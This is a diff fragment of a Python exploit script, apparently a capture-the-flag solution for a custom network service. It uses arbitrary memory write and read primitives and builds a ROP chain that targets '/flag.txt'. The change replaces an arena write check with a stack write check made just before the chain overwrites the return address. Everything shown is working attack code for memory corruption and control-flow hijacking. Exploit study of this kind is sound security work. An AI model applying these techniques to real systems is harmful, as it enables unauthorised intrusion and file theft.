@@ -351,16 +351,15 @@ def exploit(host, port, cand):
     chain = b"".join(struct.pack("<Q", x) for x in rop)
     chain += b"ROP_OK\n\x00" + b"/flag.txt\x00".ljust(16, b"\x00") + b"\x00" * 112
 
-    if cand == 0:   # confirm echo_write actually lands: write a marker, read it back
-        tgt = pie + off["arena"] + 0x100000     # a quiet, persistent spot in the arena
-        mk = b"MARKER42"
+    if cand == 0:   # confirm a STACK write lands (one request: write then recall)
+        tgt = retslot + 0x80                    # a stack slot near (not) the return
+        mk = b"STK_MRK!"
         poison(host, port)
         mv = struct.pack("<qqq", 2, len(mk), tgt)
-        seance(host, port, b'summon $f = "' + esc(mv) + b'"; summon $d = "' +
-               esc(mk) + b'"; echo_write($d);')
-        back = forge_read(host, port, tgt, 8)
-        log("[*] WRITE-CONFIRM wrote %r read back %r -> %s"
-            % (mk, back, "OK" if back == mk else "MISMATCH"))
+        r = seance(host, port, b'summon $f = "' + esc(mv) + b'"; summon $d = "' +
+                   esc(mk) + b'"; echo_write($d); whisper recall();')
+        log("[*] STACK-WRITE-CONFIRM wrote %r recall %r -> %s"
+            % (mk, r[:8], "OK" if r[:8] == mk else "MISMATCH"))
 
     tail = forge_write(host, port, retslot, chain)          # lay chain + trigger
     log("[*] cand %d finale resp %d bytes: %r" % (cand, len(tail), tail[:80]))
